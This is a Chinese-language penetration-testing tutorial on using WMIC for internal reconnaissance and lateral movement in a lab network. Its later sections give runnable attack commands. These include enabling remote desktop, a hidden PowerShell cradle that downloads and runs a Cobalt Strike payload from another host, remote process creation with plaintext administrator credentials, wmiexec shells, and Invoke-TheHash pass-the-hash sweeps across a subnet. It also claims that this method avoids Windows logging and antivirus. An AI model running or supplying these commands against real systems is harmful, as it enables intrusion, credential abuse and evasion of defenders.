0x01 WMIC介绍

WMIC是扩展WMI（Windows Management Instrumentation，Windows管理工具），提供了从命令行接口和批命令脚本执行系统管理的支持。WMIC比WMI简单、直观得多。自从PsExec被杀毒软件监控之后，黑客们又开始转移到WMI上，通过渗透测试发现，使用wmiexec进行横向移动时，Windows不会做任何日志记录。



0x02 WMIC的使用方法

WMIC有交互模式和非交互模式

交互模式:

wmic


假如进入了这个模式，输入exit退出即可


而在内网渗透中往往都会使用非交互模式进行信息收集等操作


非交互模式：

查看wmic对电脑所能操作的详细别名

wmic /?


WMIC语法如下：

(<别名> [WMI 对象] |<别名> [<路径 where>] |[<别名>] <路径 where>)[<谓词子句>]



下面使用USERACCOUNT-用户账户管理 进行演示


1.查看该别名的用法

Wmic USERACCOUNT /?


 

2.列举系统中的用户详细信息

Wmic USERACCOUNT list



3.查看list的列表格式

每一个用法有不懂使用的可以在后面加/?进行查看能操作的列表格式，每一个都表明着能列出的参数

wmic USERACCOUNT list /?


 


wmic USERACCOUNT list brief


也可以使用get来获取自己想要看到的参数


4.使用get获取指定参数

wmic USERACCOUNT get domain,name,caption


  


5.使用where条件查询获取指定参数

wmic USERACCOUNT where name="hello" get domain,name,caption





0x03 使用WMIC进行信息收集

1.查询系统中所安装的补丁
wmic qfe get Caption,Description,HotFixID,InstalledOn

 


2.查询用户信息

wmic USERACCOUNT list brief



3.查询进程信息

wmic PROCESS list brief


Wmic PROCESS call create c:\windows\system32\cmd.exe

启动指定路径的exe程序

更多操作使用Wmic PROCESS call /?进行查看


4.查询服务信息

wmic service list brief



5.查询计划任务

wmic job list brief



6.查看安装的软件

wmic PRODUCT get name,version



7.查找c盘下名为php的目录

wmic FSDIR where "drive='c:' and filename='php'" get name



8.判断目标系统是否为虚拟机

wmic onboarddevice list brief




9.查询是否安装杀软

wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe



10.查询本机共享列表

wmic SHARE list brief



创建共享

WMIC SHARE CALL Create"","test","3","TestShareName","","c:\test",0



删除共享

wmic share  where "name='TestShareName'" call delete


需要一定的权限才能进行创建及删除


11.查询开机启动项

wmic STARTUP list brief



12.查询目标系统相关信息

wmic os get name,version,BuildNumber,SystemDirectory



13.查询域控制器

wmic ntdomain list brief



14.开启远程桌面

wmic rdtoggle list

查看是否开启远程桌面
0代表关闭，1代表开启


2008及2012:

wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesettingwhere (__CLASS != "") call setallowtsconnections 1 
wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where(TerminalName ='RDP-Tcp') call setuserauthenticationrequired 1



2003:

wmic RDTOGGLE WHEREServerName='%COMPUTERNAME%' call SetAllowTSConnections 1

0x05使用WMIC进行横向移动

1.打开指定程序

只会在后台中运行

wmic /node:192.168.213.132 /user:administrator /password:0123abcd** process call create calc


 

2.CS上线

wmic /node:192.168.213.132 /user:administrator /password:0123abcd** process call create"powershell.exe -nop -w hidden -c \"IEX ((new-objectnet.webclient).downloadstring('http://192.168.213.128:80/a'))\""



3.kali自带pth工具

pth-winexe -U administrator%0123abcd** --system --ostype=1 //192.168.213.132 cmd



4.wmiexec.vbs

脚本下载地址：

https://www.secpulse.com/wp-content/uploads/2015/05/cache-a360611dc24d240989799c29c555e4b7_wmiexec-v1_1.rar
cscript.exe //nologo wmiexec.vbs /shell 192.168.213.137 administrator 0123abcd**



5.Invoke-TheHash.ps1

在横向移动时，抓取了管理员的hash，可以使用该脚本批量撞指定网段的机器，需要同时加载Invoke-WMIExec.ps1、Invoke-TheHash.ps1

脚本地址：

https://github.com/Kevin-Robertson/Invoke-TheHash




1)在内网的机器上放入脚本，并用python在脚本所在的目录开启一个Web server服务

python3 -m http.server 8000



2)   加载脚本

IEX(New-Object Net.WebClient).DownloadString('http://192.168.213.132:8000/Invoke-WMIExec.ps1');
IEX (New-Object Net.WebClient).DownloadString('http://192.168.213.132:8000/Invoke-TheHash.ps1');



3）使用

Invoke-TheHash-Type WMIExec -Target 192.168.213.0/24 -Username administrator -Hash 542241599d52943493a2ebefbb381063


假如是域环境则加-Domain 域名，即可
